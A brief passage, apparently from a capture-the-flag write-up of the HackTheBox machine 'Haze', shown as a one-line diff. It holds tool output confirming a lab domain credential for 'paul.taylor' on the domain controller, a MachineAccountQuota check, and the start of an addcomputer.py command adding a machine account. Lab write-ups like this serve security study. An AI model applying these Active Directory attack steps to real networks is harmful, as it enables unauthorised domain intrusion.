@@ -1,0 +1,1 @@
+domain:haze.htb) ( signing:None ) ( channel binding:Never ) LDAP 10.10.11.61 389 DC01 [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 MAQ 10.10.11.61 389 DC01 [*] Getting the MachineAccountQuota MAQ 10.10.11.61 389 DC01 MachineAccountQuota: 10 That means that each user can add up to 10 machines to the domain. I’ll do that: oxdf@hacky$ addcomputer.py -computer-name '0xdf$'
